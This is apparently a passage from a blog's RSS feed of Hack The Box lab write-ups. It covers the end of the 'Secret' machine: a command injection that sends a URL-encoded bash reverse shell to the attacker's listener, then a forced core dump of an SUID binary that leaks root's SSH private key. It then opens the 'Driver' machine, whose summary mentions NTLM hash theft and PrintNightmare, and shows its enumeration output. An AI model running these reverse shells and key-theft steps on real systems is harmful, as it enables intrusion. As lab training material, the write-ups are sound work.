<p>This time I&rsquo;ll setup a netcat listener and send URL-encoded bash reverse shell and</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22&#34;</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.28<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.120<span class="o">]</span> <span class="m">46050</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2131<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span>
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
</span></span></code></pre></div><p>I&rsquo;ll upgrade my shell so it can be more interactive</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~/local-web$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> suspended  nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> continued  nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
</span></span></code></pre></div><p>The user flag is done here.</p>
<pre tabindex="0"><code>dasith@secret:~$ cat user.txt
c95a3f...[SNIP]...
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Doing a recursive search with the <code>find</code> command reveal a crash file</p>
<pre tabindex="0"><code>dasith@secret:/opt$ find / -type f -user dasith 2&gt;/dev/null | grep -v &#39;proc\|\.npm\|local-web&#39;
/var/crash/_opt_count.1000.crash
...[SNIP]...
</code></pre><p>That naming lead me to <code>/opt</code>, where I find a C code, a binary, and a log file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/$ ls /opt/
</span></span><span class="line"><span class="cl">code.c  count  valgrind.log
</span></span><span class="line"><span class="cl">dasith@secret:/$ <span class="nb">cd</span> /opt/
</span></span><span class="line"><span class="cl">dasith@secret:/opt$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">56</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 10:06 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">20</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 15:01 ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">3736</span> Oct  <span class="m">7</span> 10:01 code.c
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">16384</span> Oct  <span class="m">7</span> 10:01 .code.c.swp
</span></span><span class="line"><span class="cl">-rwsr-xr-x  <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">4622</span> Oct  <span class="m">7</span> 10:04 valgrind.log
</span></span></code></pre></div><p>The binary drews my attention because it has SUID bit.</p>
<p>When I run it, it asks for a file/directory and when it finishes, I&rsquo;m given with an option to save the results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ ./count
</span></span><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/root.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
</span></span><span class="line"><span class="cl">Path: /tmp/test
</span></span><span class="line"><span class="cl">dasith@secret:/opt$ cat /tmp/test
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
</span></span></code></pre></div><p>From here, I&rsquo;ll look into the C code.</p>
<h4 id="source-code-analysis-1">Source Code Analysis</h4>
<p>Since the rests isn&rsquo;t that important, I&rsquo;ll start from the main function</p>
<p>In the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: <code>dircount</code> if the input is a directory and <code>filecount</code> if the input is a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">stat</span> <span class="n">path_s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">summary</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter source file/directory name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">stat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">S_ISDIR</span><span class="p">(</span><span class="n">path_s</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">dircount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="n">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>The next thing this program do is dropping the root privilege to normal user, and then it&rsquo;s forced to generate a <a href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>. Lastly, it&rsquo;ll ask whether the user wants to save the result or not.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// drop privs to limit file write
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">setuid</span><span class="p">(</span><span class="n">getuid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Enable coredump generation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Save results a file? [y/N]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">89</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Path: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">fputs</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Could not open %s for writing</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The key here is that, with core dump enabled (<code> prctl(PR_SET_DUMPABLE, 1)</code>), the memory state of this program will be recorded and dumped to crash file in case the program crashes. That file is typically used for diagnosing the program fault.</p>
<h4 id="abuse-core-dump---force-crash">Abuse Core Dump - Force Crash</h4>
<p>When I open a file like <code>/root/.ssh/id_rsa</code> in this program and if by accident it crashes, the content of that <code>id_rsa</code> will definitely got dumped into the crash file.</p>
<p>Now the question is, how do I <em>crash</em> this program? According to <a href="https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd">this post</a> on StackOverFlow, sending <code>kill -11</code> can trigger a crash, which eventually produce a core dump of the crashed app.</p>
<p>First, I will open another sessions, so I have two in total. On the first session, I&rsquo;ll run the <code>count</code> program  and keep it running in the result section.</p>
<pre tabindex="0"><code>dasith@secret:/tmp/$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: y
Path: 
</code></pre><p>Then on the other session, you guess it, I will send a kill signal to crash the app.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ <span class="nb">kill</span> -11 <span class="k">$(</span>pidof count<span class="k">)</span>
</span></span></code></pre></div><p>It crashed</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">2602</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">45</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">39</span>
</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
</span></span><span class="line"><span class="cl">Path: Killed
</span></span></code></pre></div><p>The crash file is generated under <code>/var/crash/</code></p>
<pre tabindex="0"><code>dasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash
-rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash
</code></pre><p>According to <a href="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash">this post</a>, the crash file can be unpacked into a separate files using the <code> apport-unpack</code> utility, which also installed in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ mkdir .syncrst <span class="o">&amp;&amp;</span> apport-unpack /var/crash/_opt_count.1000.crash .syncrst
</span></span><span class="line"><span class="cl">dasith@secret:/tmp/$ ls -la .syncrst
</span></span><span class="line"><span class="cl">total <span class="m">440</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> dasith dasith   <span class="m">4096</span> Oct <span class="m">31</span> 08:43 .
</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">16</span> root   root     <span class="m">4096</span> Oct <span class="m">31</span> 08:25 ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 Architecture
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith <span class="m">380928</span> Oct <span class="m">31</span> 08:43 CoreDump
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">1</span> Oct <span class="m">31</span> 08:43 CrashCounter
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">24</span> Oct <span class="m">31</span> 08:43 Date
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">12</span> Oct <span class="m">31</span> 08:43 DistroRelease
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutablePath
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutableTimestamp
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 ProblemType
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCmdline
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCwd
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">64</span> Oct <span class="m">31</span> 08:43 ProcEnviron
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">2144</span> Oct <span class="m">31</span> 08:43 ProcMaps
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">1343</span> Oct <span class="m">31</span> 08:43 ProcStatus
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">2</span> Oct <span class="m">31</span> 08:43 Signal
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">29</span> Oct <span class="m">31</span> 08:43 Uname
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">3</span> Oct <span class="m">31</span> 08:43 UserGroups
</span></span></code></pre></div><p>The CoreDump file is the one that contains the <code>id_rsa</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ cat .syncrst/CoreDump
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">□☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ<span class="sb">`</span>□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
</span></span><span class="line"><span class="cl">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
</span></span><span class="line"><span class="cl">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
</span></span><span class="line"><span class="cl">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
</span></span><span class="line"><span class="cl"><span class="nv">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>Now I can login as root and grab the root flag with that key!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ ssh -i coredump.ssh root@10.10.11.120
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.11.120 (10.10.11.120)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.11.120<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-89-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Sun <span class="m">31</span> Oct <span class="m">2021</span> 08:16:22 AM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
</span></span><span class="line"><span class="cl">  Usage of /:   52.8% of 8.79GB   Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 20%               IPv4 address <span class="k">for</span> eth0: 10.10.11.120
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Sun Oct <span class="m">31</span> 07:47:50 <span class="m">2021</span> from 10.10.14.91
</span></span><span class="line"><span class="cl">root@secret:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@secret:~# cat root.txt
</span></span><span class="line"><span class="cl">d1d6d....<span class="o">[</span>SNIP<span class="o">]</span>....
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Driver</title>
      <link>https://fahmifj.github.io/hackthebox/driver/</link>
      <pubDate>Sun, 25 Sep 2022 17:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/driver/</guid>
      <description>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</description>
      <content:encoded><![CDATA[<p>Driver is also one of the machines listed in the HTB printer exploitation track. It starts with a website for updating Multi-Function Printer firmware, where it allows users to upload files to a file share. With no upload restriction, it is possible to drop off a malicious SCF file to steal the NTLM hash of anyone who tries to access the share where the file lives. The hash can be cracked to retrieve the user password and it allows me to set foothold on the machine via WinRM.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing NTLM hash</li>
<li>Printer spooler exploitation with PrintNightmare</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Responder</li>
<li>PrintNightmare exploit PoC</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Performing full TCP scan with <code>nmap</code> reveals 4 open ports: Web/HTTP on <code>80</code> , MS-RPC on <code>135</code> , SMB on <code>445</code>, and WinRM on <code>5985</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.106 driver
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.106 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 80,135,445,5985 -sC -sV -oA nmap/all-tcp-ports-driver 10.10.11.106
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 16:25 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.106
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.049s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http         Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for</span> admin
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">Service Info: Host: DRIVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-19T03:25:40
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-10-18T23:16:49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 47.37 seconds
</span></span></code></pre></div><p>Based on the results, it seems the website on port 80 requires an authentication first.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous login is not allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.106 
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Poking the website with curl returns a <code>401 Unauthorized</code> response.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ curl -sv 10.10.11.106
</span></span><span class="line"><span class="cl">*   Trying 10.10.11.106:80...
</span></span><span class="line"><span class="cl">* Connected to 10.10.11.106 <span class="o">(</span>10.10.11.106<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c1">#0)</span>
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 10.10.11.106
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.74.0
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">401</span> Unauthorized
